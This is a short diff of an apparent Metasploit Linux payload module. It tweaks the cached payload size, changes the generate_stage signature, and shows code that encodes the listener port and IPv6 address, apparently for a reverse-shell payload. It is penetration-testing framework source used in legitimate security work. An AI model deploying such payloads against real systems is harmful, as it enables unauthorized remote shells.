@@ -10,7 +10,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 168
+  CachedSize = 167
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -29,12 +29,13 @@ module MetasploitModule
     ))
   end
 
-def generate_stage(opts={})
+def generate_stage
       port_order = ([1,0])
       tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../)
       tcp_port.pop
       tcp_port.shift
       tcp_port = (port_order.map{|x| tcp_port[x]}).join('')
+
       ip_order =  ([3, 2, 1, 0])
       my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
       first = (my_ipv6[0].unpack('H*')).to_s.scan(/../)
